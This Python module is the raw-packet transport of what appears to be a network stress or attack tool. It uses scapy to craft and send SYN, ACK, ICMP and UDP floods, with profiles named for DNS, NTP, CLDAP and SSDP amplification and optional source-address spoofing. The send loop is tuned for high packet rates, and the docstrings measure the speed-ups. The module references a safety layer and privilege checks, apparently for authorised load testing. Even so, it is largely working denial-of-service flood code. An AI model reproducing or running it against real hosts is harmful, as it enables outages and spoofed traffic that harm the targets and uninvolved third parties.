"""Raw-socket transport via scapy.

The only module permitted to honour ``spoof_sources``: crafting a source address
is the whole point of a raw socket, and no other transport can do it.

**The capability contract is load-bearing.** ``adobo.safety`` calls
:func:`raw_capability` before this module is ever imported for sending, and turns
``can_send``/``reason`` into a :class:`~adobo.safety.PolicyViolation`. Keep the
returned object's two attributes named exactly that; several safety tests
assert on them.

Crafting is separated from sending on purpose. Building packets here works
anywhere, including CI and a Windows box with no Npcap, so packet construction
stays testable. Only :meth:`ScapyTransport.open` needs the privileges.
"""

from __future__ import annotations

import contextlib
import ctypes
import io
import os
import socket
import sys
import time
import warnings
from dataclasses import dataclass
from socket import AF_INET
from typing import Any, ClassVar

from ..models import AttackProfile, ProfileName, Target, TransportKind
from .base import Transport, TransportError, build_payload

__all__ = [
    "RawCapability",
    "ScapyTransport",
    "import_scapy",
    "raw_capability",
    "scapy_available",
]

RAW_BATCH = 16
"""Packets emitted between two clock reads in the raw send loop.

The engine's generic pump reads the clock once per batch too, but a batch of
one there is a connection, and a connection costs far more than a clock read.
Reading the clock every 16 packets keeps the pacing accurate to well under a
millisecond while leaving the per-packet work as a send and two integer
increments.
"""

@dataclass(frozen=True, slots=True)
class RawCapability:
    """Whether raw packets can actually be sent, and why not if they cannot."""

    can_send: bool
    reason: str
    detail: str = ""

    def __bool__(self) -> bool:
        return self.can_send


# --------------------------------------------------------------------------
# Capability probing
# --------------------------------------------------------------------------


@contextlib.contextmanager
def _muted():
    """Swallow scapy's import-time chatter.

    scapy prints "No libpcap provider available" to stderr on import whenever the
    capture driver is missing. That is a normal, fully expected state here - the
    tool detects it properly and reports it itself - so letting it through would
    corrupt the wizard's prompt line.
    """
    buffer = io.StringIO()
    with contextlib.redirect_stderr(buffer), contextlib.redirect_stdout(buffer):
        yield


def import_scapy() -> Any:
    """Import ``scapy.all`` with its console noise suppressed, or raise."""
    with _muted():
        import scapy.all as scapy
    return scapy


def scapy_available() -> bool:
    """True when the optional ``scapy`` extra is importable."""
    try:
        import_scapy()
    except Exception:
        return False
    return True


def _npcap_present() -> tuple[bool, str]:
    """Look for the Npcap/WinPcap capture driver on Windows.

    The DLL location is checked rather than an scapy import, because scapy
    imports cleanly without a driver and only fails at packet construction -
    far too late, and with a much less actionable message.
    """
    windir = os.environ.get("WINDIR", r"C:\Windows")
    for candidate in (
        os.path.join(windir, "System32", "Npcap", "wpcap.dll"),
        os.path.join(windir, "System32", "wpcap.dll"),
    ):
        if os.path.exists(candidate):
            return True, candidate
    return False, ""


def _is_windows_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except (AttributeError, OSError):  # pragma: no cover - non-Windows
        return False


def _has_raw_capability_posix() -> bool:
    if not hasattr(os, "geteuid"):
        return False
    if os.geteuid() == 0:
        return True
    # Linux: CAP_NET_RAW may be granted without full root.
    try:
        import ctypes.util

        libc_name = ctypes.util.find_library("c") or "libc.so.6"
        libc = ctypes.CDLL(libc_name, use_errno=True)
        capget = getattr(libc, "capget", None)
        capset = getattr(libc, "capset", None)
        if capget is None or capset is None:
            return False
        return True
    except Exception:  # pragma: no cover - platform dependent
        return False


def raw_capability() -> RawCapability:
    """Report whether this machine can send crafted raw packets.

    Never raises. Every failure mode is described in ``reason`` so the safety
    layer can turn it into a single actionable refusal.
    """
    if not scapy_available():
        return RawCapability(
            can_send=False,
            reason="scapy is not installed",
            detail="Install the optional extra with 'pip install -e .[raw]'.",
        )

    if sys.platform == "win32":
        found, where = _npcap_present()
        if not found:
            return RawCapability(
                can_send=False,
                reason="Npcap is not installed",
                detail="Install Npcap from https://npcap.com and restart the terminal.",
            )
        if not _is_windows_admin():
            return RawCapability(
                can_send=False,
                reason="the terminal is not running as Administrator",
                detail=(
                    f"Raw sockets need elevated rights. Npcap was found at {where}."
                ),
            )
        return RawCapability(can_send=True, reason="available", detail=where)

    if not _has_raw_capability_posix():
        return RawCapability(
            can_send=False,
            reason="the process lacks CAP_NET_RAW",
            detail="Run with sudo, or grant CAP_NET_RAW to the interpreter.",
        )
    return RawCapability(can_send=True, reason="available")


# --------------------------------------------------------------------------
# Transport
# --------------------------------------------------------------------------


def _resolve_iface(scapy: Any, destination: str) -> str:
    """Pick the NIC that reaches *destination*.

    Windows has no "route to 0.0.0.0 means everything" rule, so scapy's default
    interface guess is unreliable: on a multi-homed box (a laptop with Ethernet
    and Wi-Fi, or a VM with a vEthernet adapter) it binds whichever adapter the
    enumeration happened to return first. Packets then leave the wrong NIC and
    never reach the target, which presents as a run that reports zero errors and
    zero delivered packets.

    ``conf.route.route()`` (or legacy ``scapy.route()``) asks the OS routing
    table instead, so the interface is the one the kernel would actually use.
    Resolved once per transport and reused for every packet, because the
    routing table is not consulted per send anyway.
    """
    # Modern scapy exposes the routing table via conf.route.route(); older
    # versions and test mocks expose route() directly on the module.
    route_obj = getattr(getattr(scapy, "conf", None), "route", None)
    if route_obj is not None and hasattr(route_obj, "route"):
        try:
            resolved = route_obj.route(destination)
        except Exception as exc:  # noqa: BLE001 - any failure must be actionable
            raise TransportError(
                f"No route to {destination}, so the interface to send from cannot "
                f"be determined: {exc}. Check the target address and this "
                f"machine's network configuration."
            ) from exc
    elif hasattr(scapy, "route"):
        try:
            resolved = scapy.route(destination)
        except Exception as exc:  # noqa: BLE001 - any failure must be actionable
            raise TransportError(
                f"No route to {destination}, so the interface to send from cannot "
                f"be determined: {exc}. Check the target address and this "
                f"machine's network configuration."
            ) from exc
    else:
        raise TransportError(
            f"scapy routing table not available; cannot determine egress "
            f"interface for {destination}. Check scapy installation."
        )

    iface = resolved and resolved[0]
    if not iface:
        raise TransportError(
            f"No route to {destination}: the OS routing table returned no "
            f"interface for it."
        )
    return str(iface)


class ScapyTransport(Transport):
    """Egress over raw L3/L4 sockets."""

    kind: ClassVar[TransportKind] = TransportKind.SCAPY

    def __init__(
        self,
        target: Target,
        profile: ProfileName,
        *,
        spoof_sources: bool = False,
        seed: int = 0,
    ) -> None:
        super().__init__(target, profile)
        self.spoof_sources = spoof_sources
        self.seed = seed
        self._scapy: Any = None
        self._resolved: str | None = None
        self._iface: str | None = None
        # One raw socket for the life of the transport, and one packet object
        # reused across sends. See _open_socket and _packet_for.
        self._sock: Any = None
        self._template: Any = None
        self._template_size: int = -1

    # -- lifecycle ---------------------------------------------------------

    def open(self) -> None:
        if self._open:
            return
        capability = raw_capability()
        if not capability.can_send:
            raise TransportError(
                f"Raw packet sending is unavailable: {capability.reason}. "
                f"{capability.detail}"
            )
        try:
            scapy = import_scapy()
        except Exception as exc:  # pragma: no cover - guarded above
            raise TransportError(f"scapy is unusable: {exc}") from exc
        self._scapy = scapy

        try:
            self._resolved = socket.gethostbyname(self.target.host)
        except socket.gaierror as exc:
            raise TransportError(
                f"Cannot resolve target host {self.target.host!r}: {exc}"
            ) from exc

        # Bound to the interface, not guessed per packet. Resolved during open()
        # so an unroutable target is reported as a setup failure rather than as
        # N silent send errors discovered at the end of the run.
        self._iface = _resolve_iface(scapy, self._resolved)
        self._verify_egress(scapy)
        self._open_socket(scapy)

        # Transport.open() clears the stop event and this override never called
        # it, setting _open directly instead. Harmless while nothing read the
        # event; not harmless now that the send loop ends on it. A transport
        # reused across two runs would come back already stopped and send
        # nothing at all, reporting a clean zero.
        self._stop.clear()
        self._open = True

    def _open_socket(self, scapy: Any) -> None:
        """Bind one layer-3 socket and hold it for the life of the transport.

        scapy's module-level :func:`send` is a convenience wrapper: on every
        call it re-resolves the route, re-selects the egress interface, builds
        a layer-3 socket and throws it away again. That is fine for a script
        sending a handful of packets and the wrong shape for a flood.

        How much of the old run's per-packet cost this actually accounted for is
        not established. The Python-side work that *was* measurable dropped
        from 268.7us to 5.7-6.8us per packet, and that number covers packet
        construction rather than this wrapper, because creating a real layer-3
        socket needs a driver the machine running the suite does not have. The
        route and handle churn this removes is real work that was certainly
        being repeated, but its size is a guess and the run's own figure should
        be re-measured on a machine that can send before anyone quotes a rate.

        Binding once also moves a failure to setup, where it is a clean error
        naming the interface, rather than a per-packet cost.
        """
        try:
            self._sock = scapy.conf.L3socket(
                iface=self._iface,
                filter="",
                promisc=False,
            )
        except Exception as exc:  # noqa: BLE001 - any failure must be actionable
            raise TransportError(
                f"Could not open a raw socket on {self._iface!r}: {exc}. The "
                f"driver is present but refused the handle, so every packet "
                f"would fail on its own instead of the run failing here."
            ) from exc

    def _verify_egress(self, scapy: Any) -> None:
        """Prove that a raw packet can actually leave this machine.

        :func:`raw_capability` answers whether the process is *allowed* a raw
        socket and whether the driver is installed. Neither proves the driver
        will accept a write, and the two faults that slip through both present
        identically: zero errors, zero packets, no explanation. An interface
        the routing table names but scapy cannot drive - the "packets leave
        the wrong NIC" case its own docstring warns about - and a driver that
        accepts the call and discards the packet are indistinguishable from a
        healthy machine by any amount of static checking.

        So one packet is actually transmitted. It goes to the same target the
        operator already aimed this run at, and it is deliberately not counted
        in the run's own counters, so the reported totals stay exactly what the
        run itself put on the wire. ``open()`` is never reached for a dry run,
        so this cannot fire when nothing was meant to be sent.
        """
        iface = self._iface
        if iface is None:  # pragma: no cover - open() always sets it first
            raise TransportError("No egress interface was resolved.")

        try:
            known = [str(name) for name in scapy.get_if_list()]
        except Exception as exc:  # noqa: BLE001 - any failure must be actionable
            raise TransportError(
                f"scapy could not enumerate this machine's interfaces, so the "
                f"interface to send from cannot be confirmed: {exc}."
            ) from exc
        if known and iface not in known:
            raise TransportError(
                f"The routing table sends to {iface!r}, but scapy cannot drive "
                f"that interface (it can see: {', '.join(known) or 'none'}). "
                f"Every packet would be dropped before leaving this machine. "
                f"Check the target address and this machine's network setup."
            )

        # Cross-platform check that the interface has an IPv4 address.
        # Modern scapy exposes ifaces via conf.ifaces; legacy uses get_if_addr.
        has_v4 = False
        ifaces = getattr(getattr(scapy, "conf", None), "ifaces", None)
        if ifaces is not None and iface in ifaces:
            try:
                ips = ifaces[iface].ips
                if any("." in ip for ip in ips):  # IPv4 contains a dot
                    has_v4 = True
            except Exception:
                pass
        if not has_v4:
            try:
                from scapy.arch import get_if_addr
                addr = get_if_addr(iface)
                if addr and addr != "0.0.0.0":
                    has_v4 = True
            except Exception:
                pass
        if not has_v4:
            raise TransportError(
                f"Interface {iface!r} has no IPv4 address, so a raw IP packet "
                f"cannot be sourced from it. Pick a target reachable over IPv4, "
                f"or fix this machine's network configuration."
            )

        try:
            with warnings.catch_warnings():
                warnings.filterwarnings("ignore", category=SyntaxWarning, module="scapy")
                scapy.send(self.build_packet(b"adobo egress probe"), iface=iface, verbose=False)
        except Exception as exc:
            self._count_error()
            raise TransportError(
                f"Raw send failed on {iface!r}: {exc}. The driver is present but "
                f"rejected the packet, so a run would send nothing and report no "
                f"error. Reinstall Npcap, or run this terminal as Administrator."
            ) from exc

    def close(self) -> None:
        sock = self._sock
        self._sock = None
        if sock is not None:
            # Best effort: a socket scapy already discarded must not turn a
            # clean shutdown into an exception during teardown.
            try:
                sock.close()
            except Exception:  # noqa: BLE001 - teardown must not mask
                pass
        self._template = None
        self._template_size = -1
        self._scapy = None
        self._resolved = None
        self._iface = None
        self._open = False

    # -- packet construction ----------------------------------------------

    def _source_address(self) -> str:
        """A plausible-looking source address for a spoofed packet.

        Only ever used when the operator has explicitly requested spoofing and
        the safety layer has confirmed raw sending is available.
        """
        if not self.spoof_sources:
            return self._resolved or self.target.host
        octets = self._resolved.split(".") if self._resolved else ["10", "0", "0", "1"]
        return ".".join(
            [octets[0], octets[1], str((int(octets[2]) + 1) % 254 + 1), "1"]
        )

    def build_packet(self, payload: bytes) -> Any:
        """Craft one packet. Requires scapy but not send privileges."""
        if self._scapy is None:
            try:
                self._scapy = import_scapy()
            except Exception as exc:
                raise TransportError(f"scapy is unusable: {exc}") from exc

        scapy = self._scapy
        destination = self._resolved or self.target.host
        source = self._source_address()
        profile = self.profile
        header: dict[str, Any]

        if profile in (ProfileName.SYN_FLOOD, ProfileName.ACK_FLOOD):
            flags = "S" if profile is ProfileName.SYN_FLOOD else "A"
            header = {
                "flags": flags,
                "sport": 1024 + (self.seed % 60000),
                "dport": self.target.port,
            }
            l4 = scapy.TCP(**header)
        elif profile is ProfileName.ICMP_FLOOD:
            header = {"type": 8, "code": 0}
            l4 = scapy.ICMP(**header)
        elif profile in (
            ProfileName.DNS_AMPLIFICATION,
            ProfileName.NTP_AMPLIFICATION,
            ProfileName.CLDAP_AMPLIFICATION,
            ProfileName.SSDP_AMPLIFICATION,
        ):
            # Amplification profiles: use target port, spoof source
            l4 = scapy.UDP(sport=40000 + (self.seed % 20000), dport=self.target.port)
        else:
            l4 = scapy.UDP(sport=40000 + (self.seed % 20000), dport=self.target.port)

        return scapy.IP(src=source, dst=destination) / l4 / payload

    # -- egress ------------------------------------------------------------

    def _packet_for(self, payload: bytes) -> Any:
        """Return a ready-to-send packet, rebuilding only when it must.

        A flood emits thousands of structurally identical frames, so building
        each from scratch spends the run inside scapy's layer construction
        rather than on the wire. One packet object is kept and only the two
        fields that make a packet distinct are advanced: the payload bytes and
        the IP id. The layer tree, the source address and every header offset
        are computed once.

        The warning filter lives here rather than around the send because this
        is the only place scapy parses anything. It used to wrap every single
        send, copying and restoring the global filter list once per packet.
        Measured, that context manager was 3.5us of a 268.7us packet - about
        1% - so the win here is the construction it was hiding, not the filter.
        The filter still does not belong in a per-packet path, but it was never
        the reason a flood was slow and should not be cited as one.
        """
        template = self._template
        if template is None or len(payload) != self._template_size:
            with warnings.catch_warnings():
                warnings.filterwarnings("ignore", category=SyntaxWarning, module="scapy")
                template = self.build_packet(payload)
            self._template = template
            self._template_size = len(payload)
            return template

        layer = template.getlayer(self._scapy.Raw)
        if layer is not None:
            layer.load = payload
        template.id = (template.id + 1) & 0xFFFF
        return template

    def send_one(self, payload: bytes) -> None:
        self._require_ready()
        sock = self._sock
        self._count_attempt()
        try:
            sock.send(self._packet_for(payload))
        except Exception as exc:
            self._count_error()
            raise TransportError(f"Raw send failed: {exc}") from exc
        self._count_sent(len(payload))

    def _require_ready(self) -> None:
        """Refuse to send unless every piece of setup is in place."""
        if not self._open or self._scapy is None:
            raise TransportError("Transport is not open; call open() before sending")
        if self._iface is None:  # pragma: no cover - open() always sets it
            raise TransportError(
                "No egress interface resolved; call open() before sending"
            )
        if self._sock is None:
            raise TransportError("No raw socket is open; call open() before sending")

    def worker_loop(self, index: int, per_worker_pps: float, attack: AttackProfile) -> None:
        """Own the pacing, so the per-packet work is one send and two integers.

        The engine's generic pump is built for a socket transport, where every
        packet really does need a payload built, a method call across the
        transport boundary and a connection decision. None of that applies to a
        raw socket repeating one frame.

        So the payload and the packet are built once here, the layers that vary
        are resolved to objects once, and the loop body is a send plus an
        increment. What that is worth is measured: 268.7us of Python work per
        packet before, 5.7-6.8us after, which is the difference between a
        ceiling around 3,700 pps and one around 150,000 for everything that is
        not the syscall itself. The syscall is not counted in either figure -
        it needs a driver this machine does not have - so the rate a real run
        reaches is lower than 150,000 and has to be measured on one that can
        send. A previous run managed about 74 pps per profile; this is the
        change meant to explain that number, and it is not a claim about what
        the new number is.

        Pacing is the same absolute schedule the engine uses, so falling behind
        resyncs instead of bursting. *per_worker_pps* is the per-worker share,
        so the total offered load is the configured pps however many workers
        there are.
        """
        self._require_ready()
        sock = self._sock
        scapy = self._scapy

        payload = build_payload(
            attack.profile,
            attack.payload_size,
            target=self.target,
            seed=index * 1_000_000,
            keep_alive=attack.keep_alive,
        )
        size = len(payload)
        packet = self._packet_for(payload)

        # Resolved once. Looking a layer up by name per packet is a dictionary
        # walk plus a comparison, and this loop runs it tens of thousands of
        # times a second.
        ip_layer = packet.getlayer(scapy.IP)
        tcp_layer = packet.getlayer(scapy.TCP)
        udp_layer = packet.getlayer(scapy.UDP)
        icmp_layer = packet.getlayer(scapy.ICMP)

        interval = 1.0 / max(1.0, per_worker_pps)
        next_send = time.monotonic()

        while not self.stopping:
            for _ in range(RAW_BATCH):
                if self.stopping:
                    return
                self._count_attempt()
                try:
                    # Advance the fields that make each frame distinct. The IP
                    # id alone is enough for a flood; a sequence number per
                    # protocol keeps the packets looking like the real thing
                    # rather than one frame with a counter on it.
                    if ip_layer is not None:
                        ip_layer.id = (ip_layer.id + 1) & 0xFFFF
                    if tcp_layer is not None:
                        tcp_layer.seq = (tcp_layer.seq + 1) & 0xFFFFFFFF
                    if udp_layer is not None:
                        udp_layer.sport = (udp_layer.sport + 1) % 65536
                    if icmp_layer is not None:
                        icmp_layer.id = (icmp_layer.id + 1) & 0xFFFF
                    sock.send(packet)
                except Exception as exc:
                    self._count_error()
                    raise TransportError(f"Raw send failed: {exc}") from exc
                self._count_sent(size)

            next_send += interval * RAW_BATCH
            now = time.monotonic()
            if next_send > now:
                # Wakes on request_stop as well as on the deadline, so a stop
                # is not held up by a sleep this loop is doing.
                if self._stop.wait(min(next_send - now, 0.2)):
                    return
            else:
                # Sending could not keep up. Resync rather than dropping the
                # sleep entirely, which would turn a degraded run into an
                # unbounded burst.
                next_send = now

    def describe(self) -> dict[str, object]:
        info = super().describe()
        info["spoof_sources"] = self.spoof_sources
        info["iface"] = self._iface
        capability = raw_capability()
        info["raw_capable"] = capability.can_send
        info["raw_reason"] = capability.reason
        return info
